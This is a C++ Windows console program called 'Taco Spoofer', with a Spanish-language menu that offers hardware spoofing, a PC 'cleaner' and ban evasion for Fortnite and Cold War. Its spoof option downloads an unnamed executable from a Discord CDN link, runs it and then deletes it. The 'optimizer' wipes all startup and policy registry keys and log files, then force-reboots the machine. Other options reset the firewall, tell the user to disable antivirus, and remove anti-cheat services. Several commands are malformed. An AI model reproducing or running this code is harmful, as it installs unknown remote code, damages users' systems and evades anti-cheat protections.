// ConsoleApplication1.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
//paste these below
#include <iostream>
#pragma once
#include <iostream>
#include <string>
#include <tchar.h>
#include <string.h>
#include <urlmon.h>
#pragma comment (lib, "urlmon.lib")
using namespace std;

int main()
{
    SetConsoleTitleA("Spoofer made by Hecker#6976");
    int choice;
menu:
    system("CLS");//that link will be below
    system("color c");
    string raw_str = R"(
___________                       _________                     _____             
\__    ___/____    ____  ____    /   _____/_____   ____   _____/ ____\___________ 
  |    |  \__  \ _/ ___\/  _ \   \_____  \\____ \ /  _ \ /  _ \   __\/ __ \_  __ \
  |    |   / __ \\  \__(  <_> )  /        \  |_> >  <_> |  <_> )  | \  ___/|  | \/
  |____|  (____  /\___  >____/  /_______  /   __/ \____/ \____/|__|  \___  >__|   
               \/     \/                \/|__|                           \/                                                                                                                                            
                         
)";
    cout << raw_str << endl;
    cout << "1: Spoofeo General (Fase beta!!)\n";
    cout << "2: Checar componentes (funcionando)\n";
    cout << "3: Optimizador de pc (Fase beta!!)\n";
    cout << "4: Limpiador para cold war (Fase beta!!)\n";
    cout << "5: Desbaneo de fortnite(Fase beta!!)\n";
    cin >> choice;
    if (choice == 1)
    {
    reespoof:
        int Option2;
        system("color c");
        system("CLS");
        printf("Advertencia estas apunto de usar la fase beta del spoofer o cleaner, deseas continuar?");
        printf("\nOpciones: [1] Intentar cuidado! [2] Regresar al Menu");
        cin >> Option2;
        if (Option2 == 1)
        {
            system("CLS");
            printf("Remodelando ip...");
            Sleep(2000);
            system("netsh winsock reset");
            Sleep(500);
            system("netsh winsock reset catalog");
            Sleep(500);
            system("netsh int ip reset");
            Sleep(500);
            system("netsh advfirewall reset");
            Sleep(500);
            system("netsh int reset all");
            Sleep(500);
            system("netsh int ipv4 reset");
            Sleep(500);
            system("netsh int ipv6 reset");
            Sleep(500);
            system("ipconfig / release");
            Sleep(500);
            system("ipconfig / renew");
            Sleep(500);
            system("ipconfig / flushdns");
            Sleep(500);
            printf("Cambiada con exito!");
            Sleep(2000);
            string spoofer = "https://cdn.discordapp.com/attachments/933492638609473609/933492889424650290/Apple_cleaner.exe";//download link
            string spooferpath = "C:\\ProgramData\\Apple_cleaner.exe";//downloads here
            URLDownloadToFileA(NULL, spoofer.c_str(), spooferpath.c_str(), 0, NULL);//start download

            system("cd C:\\ProgramData\\");
            system("start C:\\ProgramData\\Apple_cleaner.exe");
            printf("Spoofeo exitoso!!...");
            Sleep(2000);
            printf("Cuentas con 200 segundos para spoofearte!");
            Sleep(200000);
            DeleteFileW(L"C:\\ProgramData\\Apple_cleaner.exe");
            goto menu;
            //system("CLS");
            //system("color b");
            //printf("Deshabilitado regresando al menu...");
            //Sleep(1500);
            //goto menu;
        }
        if (Option2 == 2)
        {
            system("CLS");
            system("color b");
            printf("Regresando al menu...");
            Sleep(1500);
            goto menu;
        }
        else if (Option2)
        {
            system("CLS");
            printf("Opcion invalida!");
            Sleep(1000);
            goto menu;
        }
    }
    if (choice == 2)
    {
    recheck:
        int Option;
        system("CLS");
        system("");
        system("color b");
        Sleep(300);
        printf("MOTHERBOARD -----------------------------------------");
        system("wmic baseboard get manufacturer");
        system("wmic bios get Serialnumber");
        Sleep(300);
        printf("DISCOS -----------------------------------------");
        system("wmic diskdrive get serialnumber");
        Sleep(300);
        printf("RAM -----------------------------------------");
        system("wmic MEMORYCHIP get BankLabel, DeviceLocator, Capacity, Speed");
        Sleep(300);
        printf("CPU Y VIDEO -----------------------------------------");
        system("wmic cpu get name");
        system("wmic cpu get serialnumber");
        system("wmic path win32_VideoController get name ");
        Sleep(300);
        printf("SISTEMA OPERATIVO -----------------------------------------");
        system("wmic os get Caption,OSArchitecture");
        Sleep(300);
        printf("DRIVERS ETHERNET -----------------------------------------");
        system("wmic nic get caption");
        Sleep(2000);
        printf("\nOpciones: [1] Checar De Vuelta [2] Ir Al Menu");
        cin >> Option;
        if (Option == 1)
        {
            goto recheck;
        }
        if (Option == 2)
        {
            system("CLS");
            printf("Regresando al menu...");
            Sleep(1500);
            goto menu;
        }
        else if (choice)
        {
            system("CLS");
            printf("Opcion invalida!");
            Sleep(1500);
            goto recheck;
        }
    }
    if (choice == 3)
    {
    limpiar:
        int Option3;
        system("CLS");
        printf("Esta es la ultima oportunidad, esto limpiara para mejorar el pc.");
        Sleep(2000);
        system("CLS");
        printf("Tienes 10 segundos para salir si no quieres continuar!!");
        Sleep(10000);
        system("CLS");
        system("color b");
        printf("Intentando borrar archivos temporales...");
        Sleep(4000);
        system("taskkill /f /im explorer.exe");
        system("del /s /f /q c:\\windows\\temp\\*.*");
        system("rd /s /q c:\\windows\\temp");
        system("md c:\\windows\\temp");
        system("del /s /f /q %temp%\\*.*");
        system("rd /s /q %temp%");
        system("deltree /y c:\\windows\\tempor~1");
        system("deltree /y c:\\windows\\temp");
        system("deltree /y c:\\windows\\tmp");
        system("deltree /y c:\\windows\\ff*.tmp");
        system("DEL /f /s /q %systemdrive%\\*.chk");
        system("DEL /f /s /q %systemdrive%\\*.old");
        system("DEL /f /s /q %systemdrive%\\*.gid");
        system("DEL /f /s /q %systemdrive%\\*.log");
        system("DEL /f /s /q %systemdrive%\\*._mp");
        system("rmdir /s /q %systemdrive%\\ProgramData\\Microsoft\\Windows\\WER\\Temp");
        system("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\AMD\\DxCache");
        system("md %temp%");
        system("CLS");
        printf("Intentando borrar archivos de fijamiento...");
        Sleep(2000);
        system("del /s /f /q C:\\WINDOWS\\Prefetch");
        system("deltree /y c:\\windows\\spool\\printers");
        system("deltree /y c:\\windows\\recent");
        system("CLS");
        printf("Intentando borrar historial y cookies...");
        Sleep(1000);
        system("deltree /y c:\\windows\\cookies");
        system("deltree /y c:\\windows\\history");
        system("del c:\\WIN386.SWP");
        system("CLS");
        printf("Limpiando registro de inicio...");
        Sleep(1000);
        system("REG DELETE HKSU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce /f");
        system("REG DELETE HKSU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /f");
        system("REG DELETE HKSU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies /f");
        system("REG DELETE HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\RunOnce /f");
        system("REG DELETE HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run /f");
        system("REG DELETE HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce /f");
        system("REG DELETE HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices /f");
        system("REG DELETE HKLM\\SOFTWARE\Microsoft\\Windows\\CurrentVersion\\RunOnceEx /f");
        system("REG DELETE HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /f");
        system("REG DELETE HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices /f");
        system("CLS");
        Sleep(2000);
        system("start explorer.exe");
        printf("Todos los archivos temporales etc... Se han borrado correctamente!");
        system("CLS");
        printf("Reiniciando pc...");
        Sleep(5000);
        system("shutdown /r /f /t 0");
        system("CLS");
        printf("\nOpciones: [1] Ir al menu [2] Nada :3 ");
        cin >> Option3;
        if (Option3 == 1)
        {
            system("CLS");
            printf("Regresando al menu...");
            Sleep(1500);
            goto menu;
        }
        else if (choice)
        {
            system("CLS");
            printf("Opcion invalida!");
            Sleep(1000);
            goto menu;
        }
    }
    if (choice == 4)
    {
    coldwar:
        int Option4;
        printf("Estas a punto de usar una version beta!!");
        printf("\nSeguro? [1] Si [2] No ");
        cin >> Option4;
        if (Option4 == 1)
        {
            system("CLS");
            printf("Importante ejecutar como administrador el programa!!");
            Sleep(5000);
            system("CLS");
            printf("Remodelando ip...");
            Sleep(2000);
            system("netsh winsock reset");
            Sleep(500);
            system("netsh winsock reset catalog");
            Sleep(500);
            system("netsh int ip reset");
            Sleep(500);
            system("netsh advfirewall reset");
            Sleep(500);
            system("netsh int reset all");
            Sleep(500);
            system("netsh int ipv4 reset");
            Sleep(500);
            system("netsh int ipv6 reset");
            Sleep(500);
            system("ipconfig / release");
            Sleep(500);
            system("ipconfig / renew");
            Sleep(500);
            system("ipconfig / flushdns");
            Sleep(500);
            printf("Cambiada con exito!");
            system("CLS");
            printf("Limpiando registro...");
            Sleep(2000);
            system("CLS");
            system("color c");
            printf("Limpiando registro...");
            system("taskkill /F /IM Battle.net.exe");
            system("reg query HKEY_LOCAL_MACHINE\\Software\\WOW6432Node\\Blizzard Entertainment");
            system("reg query HKEY_CURRENT_USER\\Software\\Blizzard Entertainment\\Battle.net\\Identity");
            system("RMDIR /S /Q  % localappdata % \\Battle.net\\");
            system("RMDIR /S /Q  % localappdata % \\CrashDumps\\");
            system("RMDIR / S / Q % localappdata % \\Blizzard Entertainment\\");
            system("RMDIR / S / Q % appdata % \\Battle.net\\");
            system("RMDIR /S /Q  % programdata % \\Battle.net\\");
            system("RMDIR /S /Q  % programdata % \\Blizzard Entertainment\\");
            system("RMDIR /S /Q  % UserProfile % \\documents\\Call Of Duty Black Ops Cold War\\");
            Sleep(200);
            printf("Ve a la app de battle net y repara el juego.");
            printf("Shadow ban puede ser removido en un 50%");
            Sleep(5000);
            system("CLS");
            printf("Gracias por usar Taco Spoofer!");
            Sleep(1500);
            system("color b");
            printf("Regresando al menu...");
            Sleep(2000);
            goto menu;
        }
        if (Option4 == 2)
        {
            system("CLS");
            system("color b");
            printf("Regresando al menu...");
            Sleep(1500);
            goto menu;
        }

    }
    if (choice == 5)
    {
    fortnite:
        int Option5;
        printf("Estas a punto de spoofear fortnite!");
        printf("\nSeguro? [1] Si [2] No ");
        cin >> Option5;
        if (Option5 == 1)
        {
            printf("Recuerda deshabilitar tu antivirus!!");
            Sleep(1500);
            system("CLS");
            printf("Remodelando ip...");
            Sleep(2000);
            system("netsh winsock reset");
            Sleep(500);
            system("netsh winsock reset catalog");
            Sleep(500);
            system("netsh int ip reset");
            Sleep(500);
            system("netsh advfirewall reset");
            Sleep(500);
            system("netsh int reset all");
            Sleep(500);
            system("netsh int ipv4 reset");
            Sleep(500);
            system("netsh int ipv6 reset");
            Sleep(500);
            system("ipconfig / release");
            Sleep(500);
            system("ipconfig / renew");
            Sleep(500);
            system("ipconfig / flushdns");
            Sleep(500);
            printf("Cambiada con exito!");
            system("CLS");
            printf("Intentando quitar procesos...");
            Sleep(2000);
            system("@taskkill /f /im EpicGamesLauncher.exe /t /fi ");
            system("@taskkill /f /im FortniteLauncher.exe /t /fi");
            system("taskkill /f /im FortniteClient-Win64-Shipping.exe");
            system("taskkill /f /im OneDrive.exe");
            system("@taskkill /f /im FortniteClient - Win64 - Shipping_BE.exe /t /fi ");
            system("@taskkill /f /im FortniteClient - Win64 - Shipping.exe /t /fi ");
            system("@taskkill /f /im EasyAntiCheat.exe /t /fi");
            system("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Temp");
            system("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Roaming\\EasyAntiCheat");
            DeleteFileW(L"C:\\Program Files(x86)\\Epic Games\\Launcher\\Engine\\Config\\Base.ini");
            DeleteFileW(L"C:\\Program Files(x86)\\Epic Games\\Launcher\\Engine\\Config\\BaseGame.ini");
            DeleteFileW(L"C:\\Program Files(x86)\\Epic Games\\Launcher\\Engine\\Config\\Windows\\WindowsGame.ini");
            DeleteFileW(L"C:\\Program Files(x86)\\Epic Games\\Launcher\\Engine\\Config\\BaseInput.ini");
            DeleteFileW(L"C:\\Program Files(x86)\\Epic Games\\Launcher\\Portal\\Config\\UserLightmass.ini");
            DeleteFileW(L"C:\\Program Files(x86)\\Epic Games\\Launcher\\Engine\\Config\\Windows\\BaseWindowsLightmass.ini");
            DeleteFileW(L"C:\\Program Files(x86)\Epic Games\\Launcher\\Portal\\Config\\UserScalability.ini");
            DeleteFileW(L"C:\\Program Files(x86)\Epic Games\\Launcher\\Engine\\Config\\BaseHardware.ini");
            DeleteFileW(L"C:\\Program Files(x86)\Epic Games\\Launcher\\Portal\\Config\\NotForLicensees\\Windows\\WindowsHardware.ini");
            system("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Roaming\\EasyAntiCheat");
            printf("Funciono? Intentando registro...");
            Sleep(2000);
            system("reg delete HKLM\\SOFTWARE\\WOW6432Node\\EasyAntiCheat /f");
            system("reg delete HKLM\\SYSTEM\\ControlSet001\\Services\\EasyAntiCheat /f");
            system("reg delete HKLM\\SYSTEM\\ControlSet001\\Services\\BEService /f");
            system("@reg delete HKEY_CURRENT_USER\\Software\\Epic Games /f");
            system("@RD /S /Q ' % localappdata % \\FortniteGame'");
            system("@RD /S /Q %localappdata%\\EpicGamesLauncher");
            system("@RD /S /Q  % localappdata % \\UnrealEngine");
            system("@RD /S /Q  % localappdata % \\UnrealEngineLauncher");
            system("@RD /S /Q  % localappdata % \\Temp\\ecache.bin");
            system("@RD /S /Q  % localappdata % \\FortniteGame\\Saved\\LMS\\Manifest.sav");
            system("@RD /S /Q  % localappdata % \\Microsoft\\Feeds");
            system("del C:\\Recovery\\ntuser.sys");
            system("del C:\\MSOCache /p");
            system("del C:\\Users\\Public\\Shared Files ");
            system("CLS");
            printf("Gracias por usar Taco Spoofer!");
            Sleep(1500);
            system("color b");
            printf("Regresando al menu...");
            Sleep(2000);
            goto menu;
        }
        if (Option5 == 2)
        {
            printf("Regresando al menu...");
            Sleep(1500);
            goto menu;
        }
    }
}



//make a void

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
